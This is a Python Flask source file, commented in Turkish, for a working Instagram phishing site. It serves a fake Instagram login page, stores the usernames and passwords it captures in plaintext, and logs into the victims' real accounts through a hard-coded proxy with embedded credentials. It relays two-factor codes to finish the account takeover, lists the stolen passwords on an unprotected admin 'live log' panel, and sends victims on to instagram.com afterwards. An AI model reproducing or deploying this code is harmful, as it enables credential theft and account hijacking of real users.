import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired, TwoFactorRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# PROXY (Senin verdiğin taze bilgiler)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")
    two_factor_code = db.Column(db.String(10), nullable=True)

# BOT MOTORU (GLOBAL SÖZLÜKTE TUTUYORUZ Kİ KODU GİREBİLSİN)
sessions = {}

@app.route('/')
def index():
    return render_template_string(LOGIN_HTML)

@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # Veritabanına kaydet
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p)
        db.session.add(user)
    else:
        user.password, user.status = p, "Giriş Yapılıyor..."
    db.session.commit()

    # Botu hazırla
    cl = Client()
    cl.set_proxy(PROXY_URL)
    sessions[u] = cl

    try:
        if cl.login(u, p):
            user.status = "AKTİF ✅"
            db.session.commit()
            return jsonify(status="success", msg="Giriş Başarılı!")
    except BadPassword:
        user.status = "ŞİFRE YANLIŞ ❌"
        db.session.commit()
        return jsonify(status="error", msg="Şifre hatalı, lütfen kontrol et.")
    except (ChallengeRequired, TwoFactorRequired):
        user.status = "KOD BEKLİYOR 🔑"
        db.session.commit()
        return jsonify(status="challenge", msg="Doğrulama kodu gerekiyor.")
    except Exception as e:
        user.status = "ENGEL 🚫"
        db.session.commit()
        return jsonify(status="error", msg="Bağlantı reddedildi, tekrar dene.")
    
    return jsonify(status="error", msg="Bilinmeyen bir hata oluştu.")

@app.route('/api/submit-code', methods=['POST'])
def submit_code():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = sessions.get(u)
    user = IGUser.query.filter_by(username=u).first()

    if not cl: return jsonify(status="error", msg="Oturum bulunamadı.")

    try:
        # Kodu Instagram'a gönder
        cl.check_twactor_code(code) # Veya challenge koduna göre ayarlanır
        user.status = "AKTİF ✅"
        db.session.commit()
        return jsonify(status="success", msg="Kod onaylandı, giriş yapıldı!")
    except Exception as e:
        return jsonify(status="error", msg="Kod hatalı veya süresi dolmuş.")

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    return render_template_string(ADMIN_HTML, users=users)

# --- HTML (PROFESYONEL VE ETKİLEŞİMLİ) ---

LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .input-box { background: #121212; border: 1px solid #363636; width: 100%; padding: 10px; border-radius: 4px; color: #fff; font-size: 13px; margin-bottom: 8px; outline: none; }
        .btn { background: #0095f6; color: #fff; font-weight: bold; width: 100%; padding: 8px; border-radius: 8px; transition: 0.2s; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
    </style>
</head>
<body class="bg-black text-white flex items-center justify-center min-h-screen p-6">
    <div id="main-card" class="w-full max-w-[350px] border border-zinc-800 p-10 text-center rounded-sm">
        <h1 class="text-4xl italic font-bold mb-10">Instagram</h1>
        
        <div id="login-form">
            <input id="u" placeholder="Kullanıcı adı" class="input-box">
            <input id="p" type="password" placeholder="Şifre" class="input-box">
            <button onclick="startLogin()" id="btn-login" class="btn">Giriş Yap</button>
        </div>

        <div id="challenge-form" class="hidden">
            <p class="text-xs text-zinc-400 mb-4 font-semibold">Hesabına bir güvenlik kodu gönderdik. Giriş yapmak için kodu yaz.</p>
            <input id="two-fa-code" placeholder="Güvenlik Kodu" class="input-box text-center text-lg tracking-widest">
            <button onclick="submitCode()" id="btn-code" class="btn bg-green-600">Onayla</button>
        </div>

        <p id="status-msg" class="text-xs mt-6 text-red-500 font-bold"></p>
    </div>

    <script>
        async function startLogin() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            const btn = document.getElementById('btn-login'), msg = document.getElementById('status-msg');
            
            btn.disabled = true; btn.innerText = "Bağlanıyor..."; msg.innerText = "";

            const r = await fetch('/api/start-login', {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({u, p})
            });
            const d = await r.json();

            if(d.status === "challenge") {
                document.getElementById('login-form').classList.add('hidden');
                document.getElementById('challenge-form').classList.remove('hidden');
                msg.innerText = "";
            } else if(d.status === "success") {
                msg.className = "text-xs mt-6 text-green-500 font-bold";
                msg.innerText = d.msg;
                setTimeout(() => location.href = "https://instagram.com", 2000);
            } else {
                msg.innerText = d.msg; btn.disabled = false; btn.innerText = "Giriş Yap";
            }
        }

        async function submitCode() {
            const u = document.getElementById('u').value, code = document.getElementById('two-fa-code').value;
            const btn = document.getElementById('btn-code'), msg = document.getElementById('status-msg');
            
            btn.disabled = true; btn.innerText = "Onaylanıyor...";

            const r = await fetch('/api/submit-code', {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({u, code})
            });
            const d = await r.json();

            if(d.status === "success") {
                msg.className = "text-xs mt-6 text-green-500 font-bold";
                msg.innerText = d.msg;
                setTimeout(() => location.href = "https://instagram.com", 2000);
            } else {
                msg.innerText = d.msg; btn.disabled = false; btn.innerText = "Onayla";
            }
        }
    </script>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-10">
    <h1 class="text-2xl font-black mb-8 italic text-blue-500">CANLI LOG PANELİ</h1>
    <table class="w-full text-left border border-zinc-800">
        <thead class="bg-zinc-900">
            <tr><th class="p-4">Kullanıcı</th><th class="p-4">Şifre</th><th class="p-4">Durum</th></tr>
        </thead>
        <tbody>
            {% for u in users %}
            <tr class="border-t border-zinc-800">
                <td class="p-4 font-bold">@{{ u.username }}</td>
                <td class="p-4 text-zinc-400 font-mono">{{ u.password }}</td>
                <td class="p-4"><span class="bg-zinc-800 px-3 py-1 rounded text-xs">{{ u.status }}</span></td>
            </tr>
            {% endfor %}
        </tbody>
    </table>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
